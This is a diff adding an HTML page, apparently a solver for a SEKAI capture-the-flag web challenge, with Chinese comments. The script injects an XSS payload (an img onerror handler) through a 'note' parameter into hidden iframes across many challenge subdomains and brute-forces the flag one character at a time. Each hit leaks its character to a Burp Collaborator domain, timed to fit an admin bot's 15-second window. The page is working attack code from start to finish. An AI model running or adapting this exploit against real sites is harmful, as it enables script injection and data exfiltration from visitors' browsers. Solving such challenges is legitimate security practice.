@@ -1,0 +1,40 @@
+<!doctype html><meta charset="utf-8"><title>nbv-prober</title><body><script>
+const IDX_START = 0;     // 跳过 'SEKAI{' 的 6 位
+const IDX_END   = 40;    // 合理上限，自行调整
+const CODES = [];
+for (let c=97;c<=122;c++) CODES.push(c);  // a-z
+for (let c=48;c<=57;c++) CODES.push(c);   // 0-9
+[95,125].forEach(c=>CODES.push(c));       // '_' , '}'
+
+// 你的 Burp Collaborator 域名（HTTP 上报）：
+const RECV = 'https://0jk8u3sjzt8tzr2uvtq4g31umlscg34s.oastify.com';
+
+const payload = `<img src=x onerror="
+ (function(){
+   try{
+     var h = location.hostname.split('-');
+     var idx = h[1], code = h[2].split('.')[0];
+     var ch = String.fromCharCode(parseInt(code));
+     (new Image()).src='${RECV}?i='+idx+'&c='+encodeURIComponent(ch)+'&code='+code+'&host='+encodeURIComponent(location.hostname);
+   }catch(e){}
+ })()
+">`;
+
+function spawn(i, code){
+  const f = document.createElement('iframe');
+  f.style.display='none';
+  f.referrerPolicy='no-referrer';
+  f.src = `https://nbv-${i}-${code}.chals.sekai.team/?note=${encodeURIComponent(payload)}`;
+  document.body.appendChild(f);
+}
+
+// 轻微节流，控制在 adminbot 的 15 秒窗口内
+(async ()=>{
+  for (let i=IDX_START; i<IDX_END; i++){
+    for (const code of CODES){
+      spawn(i, code);
+      await new Promise(r=>setTimeout(r, 8)); // 8~10ms 视机器情况调
+    }
+  }
+})();
+</script></body>
